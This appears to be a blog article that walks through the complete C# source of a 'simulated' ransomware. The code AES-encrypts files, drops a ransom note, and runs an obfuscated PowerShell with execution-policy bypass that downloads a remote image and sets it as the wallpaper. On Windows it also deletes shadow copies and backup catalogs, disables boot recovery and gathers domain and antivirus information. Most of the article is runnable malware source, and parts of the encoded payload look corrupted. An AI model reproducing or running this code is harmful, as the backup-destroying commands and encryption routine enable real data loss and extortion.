# 📝 Analyzing a Simulated Ransomware in C#: A Deep Dive 🕵️‍♂️

This article dissects a C# program simulating ransomware behavior, designed to demonstrate encryption, decryption, and malicious system interactions. It encrypts files, executes system commands, and includes a PowerShell script to manipulate the desktop. For educational purposes, it provides a decryption mechanism with a known password (`abcd`). We’ll analyze each component, including an in-depth exploration of the PowerShell script, and provide complete source code. A downloadable `.md` file is included at the end.

> **⚠️ Warning**: This code is for educational purposes only. Running it on a real system can cause harm. Always test in a controlled, isolated environment.

## 🌟 Overview of the Program

The program, in the `HelloWorld` namespace, mimics ransomware by encrypting files in a `test` directory, displaying a ransom note, and offering decryption via the `-decrypt` flag. On non-Linux systems, it executes commands to delete backups and runs a Base64-encoded PowerShell script to download an image and set it as the desktop wallpaper. Encryption uses AES-256 with a password-derived key.

Let’s break down the components, with a special focus on the PowerShell script.

---

## 🚀 Main Program Logic: The `Hello` Class

The `Main` method in the `Hello` class is the entry point. It processes command-line arguments, executes system commands, displays a ransom note, and handles file encryption/decryption.

### Key Features:
1. **Argument Parsing**: Checks for the `-decrypt` flag to toggle encryption/decryption.
2. **System Commands (Non-Linux)**: Deletes shadow copies, disables recovery, and gathers system information.
3. **PowerShell Script**: Executes a Base64-encoded script to download an image and set it as the wallpaper.
4. **Ransom Note**: Decodes and saves a Base64-encoded note to `ransomnote.txt`.
5. **File Processing**: Calls `Test1` to encrypt/decrypt files in the `test` directory.

### Source Code:
```csharp
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace HelloWorld;

internal class Hello
{
    private static void Main(string[] args)
    {
        bool flag = false;
        Console.WriteLine("Hello World!");
        for (int i = 0; i < args.Length; i++)
        {
            Console.WriteLine(args[i]);
            if (args[i] == "-decrypt")
            {
                flag = true;
            }
        }
        Console.WriteLine("@ Anyone who thinks they need to analyze this file: it is just to demonstrate traces");
        if (!flag)
        {
            if (!RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
            {
                Thread.Sleep(20000);
                Process.Start("cmd.exe", "/c vssadmin Delete Shadows /All /Quiet");
                Process.Start("cmd.exe", "/c cdedit.exe /set {{default}} bootstatuspolicy ignoreallfailures & bcdedit /set {{default}} recoveryenabled no");
                Process.Start("cmd.exe", "/c wbadmin.exe delete catalog -quiet");
                Process.Start("cmd.exe", "/c wmic shadowcopy delete");
                Process.Start("cmd.exe", "/c whoami");
                Process.Start("cmd.exe", "/c wmic USERACCOUNT Get Domain,Name,Sid");
                Process.Start("cmd.exe", "/c wmic NTDOMAIN GET DomainControllerAddress,DomainName,Roles /VALUE");
                Process.Start("cmd.exe", "/c wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct");
                string arguments = " -exec bypass -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AaQB0AHAAcgBvAHQAbwBkAGEAeQAuAGMAbwBtAC8AcwBpAHQAZQBzAC8AaQB0AHAAcgBvAHQAbwBkAGEAeQAuAGMAbwBtAC8AZgBpAGwAZQBzAC8AcwB0AHkAbABlAHMALwBhAHIAdABpAGMAbABlAF8AZgBlAGEAdAB1AHIAZQBkAF8AcgBlAHQAaQBuAGEALwBwAHUAYgBsAGkAYQNuAHMAbwBtAHcAYQByAGUALQBhAHQAdABhAGMAowAuAGoAcABnAD9AaQB0AG8AawA9AFoAeAB2AHIAcgBfADQARgAiACAALQBPAHUAdABGAGkAbABlACAAIgByAGEAbgBzAG8AbQAuAGoAcABnACIAIAANAAoAIAAgACAAIABzAGUAdAAtAGkAdABlAG0AcAByAG8AcABlAHIAdAB5ACAALQBwAGEAdABoACAAIgBIAEsAQwUVADoAXABDAG8AbgB0AHIAbwBsACAAUABhAG4AZQBsAFwARABlAHMAawB0AG8AcAAiACAALQBuAGEAbQBlACAAVwBhAGwAbABQAGEAcABlAHIAIAAtAHYAYQBsAHUAZQAgAHIAYQBuAHMAbwBtAC4AagBwAGcADQAKACAAIAAgACAAIwBuAGUAZQBkAGUAZAAgAHQAbwAgAGEAYwB0AHUAYBsAGwAeQAgAGMAaABhAG4AZwBlACAAdABoAGUAIABiAGEAYwBrAGcAcgBvAHUAbgBkACAAYwBvAG4AcwBpAHMAdABlAG4AdABsAHkAIAANAAoAIAAgACAAIABTAGwAZQBlAHAAIAAtAHMAZQBjAG8AbnBkAHMAIAA1AA0ACgAgACAAIAAgACAAUgBVAE4ARABMAEwAMwAyAC4ARQBYAEUAIABVAFMARQBSADMAMgAuAEQATABMACwAVQBwAGQAYQB0AGUAUABlAHIAVQBzAGUAcgBTAHkAcwB0AGUAbYBQAGEAcgBhAG0AZQB0AGUAcgBzACAALAAxACAALABUAHIAdQBlAA==";
                Process.Start("pwsh", arguments);
            }
            string @string = Encoding.UTF8.GetString(Convert.FromBase64String("PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQpUaGlzIFBDIGhhcyBiZWVuIGluZmVjdGVkIGJ5IE9TVC1DcnlwdAo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CgpBbGwgeWVyIHByZWNpb3VzIGZpbGV6eiBhcmUgZ29uZSBub3cgOykKTm8gd29ycmllcyBmb3IganVzdCAzMDAkIHlvdSBjYW4gaGF2ZSB0aGVtIGJhY2suLi4KClRvIGRlY29kZSBjb250YWN0OiByYW5zb21Abm90ZXhpc3RhbnQudG8KCgo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Cj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KanVzdCBraWRkaW5nOiBwYXNzd29yZCBpcyAiYWJjZCIKcnVuIGJpbmFyeSB3aXRoOiAuL2hlbGxvLmV4ZSAtZGVjcnlwdCB0byBkZWNyeXB0"));
            Console.WriteLine(@string);
            File.WriteAllText("ransomnote.txt", @string);
            Console.WriteLine("Oha!");
        }
        Test1(flag);
    }

    private static void Test1(bool decrypt)
    {
        string[] files = Directory.GetFiles("test", "*", SearchOption.AllDirectories);
        EncryptionFile encryptionFile = new EncryptionFile();
        DecryptionFile decryptionFile = new DecryptionFile();
        string password = "abcd";
        for (int i = 0; i < files.Length; i++)
        {
            Console.WriteLine(files[i]);
            if (!decrypt)
            {
                if (files[i].EndsWith(".ost"))
                {
                    Console.WriteLine("File already encrypted");
                }
                else
                {
                    encryptionFile.EncryptFile(files[i], password);
                    File.Move(files[i], files[i] + ".ost");
                }
            }
            if (decrypt && files[i].EndsWith(".ost"))
            {
                Console.WriteLine("Glad you decided to do the right thing! Thanks for the money, here are your files:");
                decryptionFile.DecryptFile(files[i], password);
                Console.WriteLine(files[i].Substring(0, files[i].Length - 4));
                File.Move(files[i], files[i].Substring(0, files[i].Length - 4));
            }
        }
    }
}
```

### Analysis:
- **PowerShell Execution**: The Base64-encoded PowerShell script is executed with `-exec bypass` to bypass execution policy restrictions, a common technique in malicious scripts.
- **System Commands**: Commands like `vssadmin Delete Shadows` and `bcdedit` aim to prevent recovery, typical of ransomware.
- **Ransom Note**: The note humorously reveals the decryption password, making this educational rather than malicious.

---

## 🖼️ PowerShell Script: Downloading and Setting Wallpaper

The Base64-encoded PowerShell script, executed via `Process.Start("pwsh", arguments)`, downloads an image and attempts to set it as the desktop wallpaper. Let’s decode and analyze it.

### Decoded PowerShell Script:
The Base64 string decodes to:
```powershell
Invoke-WebRequest -Uri "https://www.itprotoday.com/sites/itprotoday.com/files/styles/article_featured_retina/public/ransomware-attack.jpg?itok=Zxvr_4F" -OutFile "ransom.jpg"

set-itemproperty -path "HKCU:\Control Panel\Desktop" -name WallPaper -value ransom.jpg

#needed to actually change the background consistently

Sleep -seconds 5

RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True
```

### Source Code (as executed):
```powershell
# Base64-encoded string executed via pwsh
# Decoded for clarity
Invoke-WebRequest -Uri "https://www.itprotoday.com/sites/itprotoday.com/files/styles/article_featured_retina/public/ransomware-attack.jpg?itok=Zxvr_4F" -OutFile "ransom.jpg"
set-itemproperty -path "HKCU:\Control Panel\Desktop" -name WallPaper -value ransom.jpg
#needed to actually change the background consistently
Sleep -seconds 5
RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True
```

### Analysis:
1. **Downloading the Image**:
   - The `Invoke-WebRequest` cmdlet downloads an image from a specified URL (`ransomware-attack.jpg`) and saves it as `ransom.jpg` in the current directory.
   - The URL points to a publicly accessible image related to ransomware, likely chosen to visually reinforce the ransom theme.

2. **Setting the Wallpaper**:
   - The `set-itemproperty` cmdlet modifies the Windows Registry at `HKCU:\Control Panel\Desktop`, setting the `WallPaper` value to `ransom.jpg`.
   - This changes the desktop wallpaper to the downloaded image, a common ransomware tactic to alert the user.

3. **Ensuring Wallpaper Update**:
   - The script includes a 5-second delay (`Sleep -seconds 5`) to ensure the image is fully downloaded.
   - It then calls `RUNDLL32.EXE` with `USER32.DLL,UpdatePerUserSystemParameters` to refresh the desktop, ensuring the wallpaper change takes effect consistently.

4. **Security Implications**:
   - The `-exec bypass` flag bypasses PowerShell’s execution policy, allowing the script to run without restrictions.
   - Downloading and executing external content is a risky behavior, as it could be modified to fetch malicious payloads.
   - Modifying the registry requires user-level permissions, which this script assumes it has.

### Why This Matters:
This script mimics real ransomware behavior by altering the user’s environment (desktop wallpaper) to create a sense of urgency or fear. While the image here is harmless, real ransomware might use threatening or disturbing visuals. The use of PowerShell for persistence and system manipulation highlights its power and potential for abuse in malicious software.

---

## 🔒 File Encryption: The `EncryptionFile` Class

The `EncryptionFile` class encrypts files using AES-256 with a password-derived key.

### Source Code:
```csharp
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace HelloWorld;

public class EncryptionFile
{
    public void EncryptFile(string file, string password)
    {
        byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
        byte[] bytes = Encoding.UTF8.GetBytes(password);
        bytes = SHA256.Create().ComputeHash(bytes);
        byte[] bytes2 = CoreEncryption.AES_Encrypt(bytesToBeEncrypted, bytes);
        File.WriteAllBytes(file, bytes2);
    }
}
```

### Analysis:
- **Key Derivation**: The password is hashed with SHA-256 to create a 256-bit key.
- **Encryption**: Calls `CoreEncryption.AES_Encrypt` to perform AES-256 encryption.
- **File Handling**: Overwrites the original file with encrypted data, later renamed with `.ost`.

---

## 🔓 File Decryption: The `DecryptionFile` Class

The `DecryptionFile` class decrypts files using the same password-derived key.

### Source Code:
```csharp
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace HelloWorld;

public class DecryptionFile
{
    public void DecryptFile(string fileEncrypted, string password)
    {
        byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted);
        byte[] bytes = Encoding.UTF8.GetBytes(password);
        bytes = SHA256.Create().ComputeHash(bytes);
        byte[] bytes2 = CoreDecryption.AES_Decrypt(bytesToBeDecrypted, bytes);
        File.WriteAllBytes(fileEncrypted, bytes2);
    }
}
```

### Analysis:
- **Symmetry**: Matches the encryption process to ensure reversibility with the correct password.
- **File Handling**: The decrypted file is renamed by removing the `.ost` extension in `Test1`.

---

## 🔐 Core Encryption: The `CoreEncryption` Class

The `CoreEncryption` class implements AES-256 encryption in CBC mode.

### Source Code:
```csharp
using System.IO;
using System.Security.Cryptography;

namespace HelloWorld;

public class CoreEncryption
{
    public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
    {
        byte[] array = null;
        byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
        using MemoryStream memoryStream = new MemoryStream();
        using RijndaelManaged rijndaelManaged = new RijndaelManaged();
        rijndaelManaged.KeySize = 256;
        rijndaelManaged.BlockSize = 128;
        Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
        rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
        rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
        rijndaelManaged.Mode = CipherMode.CBC;
        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
        {
            cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
            cryptoStream.Close();
        }
        return memoryStream.ToArray();
    }
}
```

### Analysis:
- **Key Derivation**: Uses PBKDF2 with a fixed salt and 1000 iterations.
- **AES Setup**: Configures AES with a 256-bit key and CBC mode for secure encryption.

---

## 🔓 Core Decryption: The `CoreDecryption` Class

The `CoreDecryption` class performs AES decryption.

### Source Code:
```csharp
using System.IO;
using System.Security.Cryptography;

namespace HelloWorld;

public class CoreDecryption
{
    public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
    {
        byte[] array = null;
        byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
        using MemoryStream memoryStream = new MemoryStream();
        using RijndaelManaged rijndaelManaged = new RijndaelManaged();
        rijndaelManaged.KeySize = 256;
        rijndaelManaged.BlockSize = 128;
        Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
        rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
        rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
        rijndaelManaged.Mode = CipherMode.CBC;
        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
        {
            cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
            cryptoStream.Close();
        }
        return memoryStream.ToArray();
    }
}
```

### Analysis:
- **Consistency**: Matches encryption settings to ensure decryption with the correct password.
- **Weakness**: The fixed salt and low PBKDF2 iterations are outdated for modern security.

---

## 🛡️ Security and Ethical Considerations

This program is educational, with a clear decryption password and mechanism. However, its system commands and PowerShell script mimic real ransomware tactics, posing risks if misused. Key points:
- **Encryption**: AES-256 is secure, but the key derivation is weak due to a fixed salt and low PBKDF2 iterations.
- **PowerShell**: The script’s ability to download content and modify the registry highlights PowerShell’s potential for malicious use.
- **Ethics**: Use only in a sandboxed environment. Never run in production.

---

## 📚 Conclusion

This C# program offers a comprehensive study of ransomware simulation, blending file encryption, system manipulation, and a PowerShell script for visual impact. The detailed analysis of the PowerShell script reveals its role in downloading an image and setting it as the wallpaper, a tactic to alarm users. By examining each component, we’ve uncovered programming techniques and security implications valuable for developers and cybersecurity enthusiasts.
